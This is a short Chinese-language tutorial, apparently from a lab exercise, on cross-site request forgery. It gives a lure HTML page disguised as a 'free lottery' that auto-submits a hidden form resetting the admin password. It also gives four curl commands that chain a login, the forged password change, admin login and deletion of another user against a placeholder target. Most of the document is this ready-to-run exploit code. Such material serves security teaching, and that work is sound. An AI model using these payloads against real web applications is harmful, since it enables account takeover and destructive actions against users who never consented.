🛡️ CSRF 跨站请求伪造（Cross-Site Request Forgery）

1️⃣ 什么是CSRF？

攻击者诱导已登录用户访问恶意页面，利用用户的登录状态，以用户身份执行非本意的操作（如修改密码）。

2️⃣ 完整攻击链

alice登录 → 修改admin密码 → 新密码登录admin → 删除用户carlos
  (获得Cookie)   (CSRF+越权)     (权限提升)      (越权操作)

3️⃣ 恶意HTML页面（Burp CSRF PoC）

<html>
<body>
<h1>🎉 免费抽奖！点击领取</h1>
<form action="http://target:5000/change-password" method="POST">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

4️⃣ curl攻击命令

# Step 1: alice登录获取Cookie
curl -c /tmp/cookies.txt -X POST http://target:5000/login \
  -d "username=alice&password=alice2025"

# Step 2: CSRF修改admin密码
curl -b /tmp/cookies.txt -X POST http://target:5000/change-password \
  -d "username=admin&new_password=hacked123"

# Step 3: 用新密码登录admin
curl -c /tmp/admin.txt -X POST http://target:5000/login \
  -d "username=admin&password=hacked123"

# Step 4: 越权删除用户
curl -b /tmp/admin.txt -X POST http://target:5000/admin/delete-user \
  -d "user_id=2"
